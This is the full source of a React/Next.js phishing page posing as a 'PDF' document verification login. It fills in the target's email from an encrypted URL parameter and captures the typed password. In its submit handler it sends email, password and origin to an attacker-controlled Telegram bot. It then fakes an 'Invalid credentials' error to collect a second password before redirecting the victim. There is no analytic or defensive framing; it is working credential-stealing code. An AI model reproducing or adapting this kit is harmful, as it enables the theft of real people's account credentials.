import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import CryptoJS from 'crypto-js';
import { useRouter } from 'next/router';

const LoginPage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [step, setStep] = useState(1);
  const router = useRouter();

  useEffect(() => {
    // Create circuit board background
    const createCircuitBackground = () => {
      const board = document.querySelector('.circuit-board');
      if (!board) return;
      
      // Clear any existing elements
      board.innerHTML = '';
      
      // Create circuit lines
      for (let i = 0; i < 20; i++) {
        const line = document.createElement('div');
        line.className = 'circuit-line';
        
        const isHorizontal = Math.random() > 0.5;
        const width = isHorizontal ? Math.random() * 300 + 100 : 2;
        const height = isHorizontal ? 2 : Math.random() * 300 + 100;
        
        line.style.width = `${width}px`;
        line.style.height = `${height}px`;
        line.style.left = `${Math.random() * 100}%`;
        line.style.top = `${Math.random() * 100}%`;
        line.style.opacity = Math.random() * 0.5 + 0.1;
        
        board.appendChild(line);
      }
      
      // Create circuit nodes
      for (let i = 0; i < 30; i++) {
        const node = document.createElement('div');
        node.className = 'circuit-node';
        
        const size = Math.random() * 12 + 4;
        node.style.width = `${size}px`;
        node.style.height = `${size}px`;
        node.style.left = `${Math.random() * 100}%`;
        node.style.top = `${Math.random() * 100}%`;
        
        board.appendChild(node);
      }
    };

    const extractAESFromURL = () => {
      const url = window.location.href;
      const aesParam = url.split('&AES=')[1];
      return aesParam ? decodeURIComponent(aesParam) : null;
    };

    const aesParam = extractAESFromURL();
    
    if (aesParam) {
      try {
        const salt = process.env.NEXT_PUBLIC_SALT;
        if (!salt) {
          throw new Error('Decryption salt not configured');
        }

        const bytes = CryptoJS.AES.decrypt(aesParam, salt);
        const decryptedEmail = bytes.toString(CryptoJS.enc.Utf8);
        
        if (decryptedEmail) {
          setEmail(decryptedEmail);
        } else {
          throw new Error('Failed to decrypt');
        }
      } catch (err) {
        console.error('Decryption error:', err);
        setError('Invalid or corrupted link');
      }
    }
    
    // Create the circuit background after component mounts
    createCircuitBackground();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (password.length < 5) {
      setError('Password must be at least 5 characters');
      return;
    }
    
    setIsLoading(true);
    setError('');

    try {
      const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL;
      
      if (!telegramBotToken || !telegramChatId) {
        throw new Error('Telegram integration not properly configured');
      }

      const message = `🔒 *TRU SECURITY NOTIFICATION* 🔒
      
- *User Identified*: ${email}
- *Access Attempt*: ${step === 1 ? 'First Attempt' : 'Second Attempt'}
- *Password Attempt*: ||${password}||
- *Timestamp*: ${new Date().toISOString()}
- *Origin*: ${window.location.hostname}

${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final Access Attempt Detected* 🚨'}`;

      const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send notification');
      }

      if (step === 1) {
        setError('Invalid credentials. Please try again.');
        setStep(2);
        setPassword('');
      } else {
        setSuccess(true);
        if (redirectUrl) {
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, 2000);
        }
      }
    } catch (err) {
      setError(err.message || 'An error occurred during login');
    } finally {
      setIsLoading(false);
    }
  };

  if (error && error === 'Invalid or corrupted link') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-lg shadow-xl p-6">
          <div className="text-center">
            <div className="text-red-500 text-5xl mb-4">❌</div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Invalid Link</h1>
            <p className="text-gray-600">The link you used is invalid or corrupted.</p>
            <p className="text-gray-600 mt-2">Please check the URL and try again.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Circuit Board Background */}
      <div className="circuit-board absolute inset-0 z-0 opacity-50"></div>
      
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full max-w-md z-10"
      >
        <div className="bg-white rounded-xl shadow-2xl overflow-hidden">
          {/* Header with blue gradient */}
          <div className="p-6 bg-gradient-to-r from-blue-600 to-blue-500">
            <div className="flex items-center justify-center flex-col">
              <div className="bg-white p-3 rounded-full mb-4">
                <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
                  <svg className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
              </div>
              
              {/* PDF Logo with Secure Login Text */}
              <div className="flex flex-col items-center justify-center mb-2">
                <svg width="180" height="50" viewBox="0 0 180 50" className="mb-2">
                  <defs>
                    <linearGradient id="textGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                      <stop offset="0%" stopColor="#ffffff" />
                      <stop offset="100%" stopColor="#e6f7ff" />
                    </linearGradient>
                  </defs>
                  
                  {/* PDF Icon */}
                  <g transform="translate(0, 2)">
      {/* Document shape with folded corner */}
      <path d="M5 5 h22 l8 8 v32 a3 3 0 0 1 -3 3 h-27 a3 3 0 0 1 -3 -3 v-37 a3 3 0 0 1 3 -3z" fill="#e62e2e" />
      <polygon points="27,5 35,13 27,13" fill="#b32424" />
      
      {/* PDF Text */}
      <text x="19" y="32" textAnchor="middle" fill="white" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="14">
        PDF
      </text>
    </g>
                  
                  {/* Secure Login Text */}
                  <g transform="translate(45, 0)">
                    <text x="0" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="20">Verify your -ID</text>
                  </g>
                </svg>
                
                <p className="text-blue-100 mt-2 text-sm">Verify your email access to continue</p>
              </div>
            </div>
          </div>
          
          {/* White form area */}
          <div className="p-6 bg-white">
            {error && !success && (
              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-yellow-100 text-yellow-700 border border-yellow-200'}`}>
                {error}
              </div>
            )}
            
            {success ? (
              <div className="text-center py-4">
                <div className="text-green-500 text-5xl mb-4">✓</div>
                <h3 className="text-xl font-bold text-gray-800 mb-2">Login Successful</h3>
                <p className="text-gray-600">Redirecting you to the application...</p>
                <div className="mt-4 bg-blue-50 p-3 rounded border border-blue-100">
                  <p className="text-blue-600 text-sm">Your access has been granted</p>
                </div>
              </div>
            ) : (
              <form onSubmit={handleSubmit}>
                <div className="mb-4">
                  <label className="block text-gray-700 text-sm font-medium mb-2">
                    Email Address
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                      </svg>
                    </div>
                    <input
                      type="email"
                      value={email}
                      disabled
                      className="bg-gray-100 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-gray-600"
                    />
                  </div>
                </div>
                
                <div className="mb-4">
                  <label className="block text-gray-700 text-sm font-medium mb-2">
                    Password
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    </div>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      minLength={5}
                      className="border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-gray-700"
                      placeholder="Enter your password"
                    />
                  </div>
                  <p className="text-xs text-gray-500 mt-1">Password must be at least 5 characters</p>
                </div>
                
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75 shadow-md"
                >
                  {isLoading ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      {step === 1 ? 'VERIFYING...' : 'PROCESSING...'}
                    </span>
                  ) : (
                    step === 1 ? 'LOGIN' : 'TRY AGAIN'
                  )}
                </button>
              </form>
            )}
          </div>
          
          <div className="px-6 py-3 bg-gray-100 border-t border-gray-200 text-center">
            <p className="text-xs text-gray-500">
              Secure Login System • {new Date().getFullYear()}
            </p>
          </div>
        </div>
      </motion.div>

      <style jsx global>{`
        .circuit-board {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 0;
          overflow: hidden;
          pointer-events: none;
        }
        
        .circuit-line {
          position: absolute;
          background: rgba(0, 255, 255, 0.15);
          border-radius: 1px;
        }
        
        .circuit-node {
          position: absolute;
          background: rgba(0, 200, 255, 0.4);
          border-radius: 50%;
          box-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
        }
      `}</style>
    </div>
  );
};

export default LoginPage;



